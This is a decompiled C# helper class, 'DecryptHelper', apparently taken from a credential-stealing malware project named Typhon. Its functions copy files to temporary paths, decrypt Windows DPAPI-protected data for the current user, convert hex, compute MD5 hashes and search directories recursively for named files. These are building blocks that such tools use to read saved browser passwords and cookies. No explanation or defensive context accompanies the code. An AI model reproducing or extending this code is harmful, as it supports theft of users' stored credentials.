using System;
using System.Collections.Generic;
using System.Globalization;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Threading;

namespace Typhon.Modules.Miscellaneous
{
	// Token: 0x0200003E RID: 62
	internal class DecryptHelper
	{
		// Token: 0x0600010C RID: 268 RVA: 0x000090BC File Offset: 0x000072BC
		public static string Base64Decode(string input)
		{
			string result;
			try
			{
				result = Encoding.UTF8.GetString(Convert.FromBase64String(input));
			}
			catch
			{
				result = input;
			}
			return result;
		}

		// Token: 0x0600010D RID: 269 RVA: 0x000090F4 File Offset: 0x000072F4
		public static string CreateTempCopy(string filePath)
		{
			string text = DecryptHelper.CreateTempPath();
			File.Copy(filePath, text, true);
			return text;
		}

		// Token: 0x0600010E RID: 270 RVA: 0x00009110 File Offset: 0x00007310
		public static string CreateTempPath()
		{
			return Path.Combine(Path.Combine(Environment.ExpandEnvironmentVariables("%USERPROFILE%"), "AppData\\Local\\Temp"), string.Concat(new object[]
			{
				"tmp",
				DateTime.Now.ToString("O").Replace(':', '_'),
				Thread.CurrentThread.GetHashCode(),
				Thread.CurrentThread.ManagedThreadId
			}));
		}

		// Token: 0x0600010F RID: 271 RVA: 0x0000918B File Offset: 0x0000738B
		public static string EncryptBlob(string rawText)
		{
			return Convert.ToBase64String(ProtectedData.Protect(Encoding.Default.GetBytes(rawText), null, DataProtectionScope.CurrentUser));
		}

		// Token: 0x06000110 RID: 272 RVA: 0x000091A4 File Offset: 0x000073A4
		public static string DecryptBlob(string EncryptedData, DataProtectionScope dataProtectionScope, byte[] entropy = null)
		{
			return Encoding.UTF8.GetString(DecryptHelper.DecryptBlob(Encoding.Default.GetBytes(EncryptedData), dataProtectionScope, entropy));
		}

		// Token: 0x06000111 RID: 273 RVA: 0x000091C4 File Offset: 0x000073C4
		public static byte[] DecryptBlob(byte[] EncryptedData, DataProtectionScope dataProtectionScope, byte[] entropy = null)
		{
			byte[] result;
			try
			{
				if (EncryptedData == null || EncryptedData.Length == 0)
				{
					result = null;
				}
				else
				{
					result = ProtectedData.Unprotect(EncryptedData, entropy, dataProtectionScope);
				}
			}
			catch (Exception value)
			{
				Console.WriteLine(value);
				result = null;
			}
			return result;
		}

		// Token: 0x06000112 RID: 274 RVA: 0x00009204 File Offset: 0x00007404
		public static byte[] ConvertHexStringToByteArray(string hexString)
		{
			if (hexString.Length % 2 != 0)
			{
				throw new ArgumentException(string.Format(CultureInfo.InvariantCulture, "The binary key cannot have an odd number of digits: {0}", new object[]
				{
					hexString
				}));
			}
			byte[] array = new byte[hexString.Length / 2];
			for (int i = 0; i < array.Length; i++)
			{
				string s = hexString.Substring(i * 2, 2);
				array[i] = byte.Parse(s, NumberStyles.HexNumber, CultureInfo.InvariantCulture);
			}
			return array;
		}

		// Token: 0x06000113 RID: 275 RVA: 0x00009278 File Offset: 0x00007478
		public static string GetMd5Hash(string source)
		{
			HashAlgorithm hashAlgorithm = new MD5CryptoServiceProvider();
			byte[] bytes = Encoding.ASCII.GetBytes(source);
			return DecryptHelper.GetHexString(hashAlgorithm.ComputeHash(bytes));
		}

		// Token: 0x06000114 RID: 276 RVA: 0x000092A4 File Offset: 0x000074A4
		private static string GetHexString(IList<byte> bt)
		{
			string text = string.Empty;
			for (int i = 0; i < bt.Count; i++)
			{
				byte b = bt[i];
				int num = (int)(b & 15);
				int num2 = b >> 4 & 15;
				if (num2 > 9)
				{
					text += ((char)(num2 - 10 + 65)).ToString(CultureInfo.InvariantCulture);
				}
				else
				{
					text += num2.ToString(CultureInfo.InvariantCulture);
				}
				if (num > 9)
				{
					text += ((char)(num - 10 + 65)).ToString(CultureInfo.InvariantCulture);
				}
				else
				{
					text += num.ToString(CultureInfo.InvariantCulture);
				}
				if (i + 1 != bt.Count && (i + 1) % 2 == 0)
				{
					text += "-";
				}
			}
			return text;
		}

		// Token: 0x06000115 RID: 277 RVA: 0x00009370 File Offset: 0x00007570
		public static List<string> FindPaths(string baseDirectory, int maxLevel = 4, int level = 1, params string[] files)
		{
			List<string> list = new List<string>();
			if (files == null || files.Length == 0 || level > maxLevel)
			{
				return list;
			}
			try
			{
				foreach (string path in Directory.GetDirectories(baseDirectory))
				{
					try
					{
						DirectoryInfo directoryInfo = new DirectoryInfo(path);
						FileInfo[] files2 = directoryInfo.GetFiles();
						bool flag = false;
						int num = 0;
						while (num < files2.Length && !flag)
						{
							int num2 = 0;
							while (num2 < files.Length && !flag)
							{
								string a = files[num2];
								FileInfo fileInfo = files2[num];
								if (a == fileInfo.Name)
								{
									flag = true;
									list.Add(fileInfo.FullName);
								}
								num2++;
							}
							num++;
						}
						foreach (string item in DecryptHelper.FindPaths(directoryInfo.FullName, maxLevel, level + 1, files))
						{
							if (!list.Contains(item))
							{
								list.Add(item);
							}
						}
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
			return list;
		}
	}
}
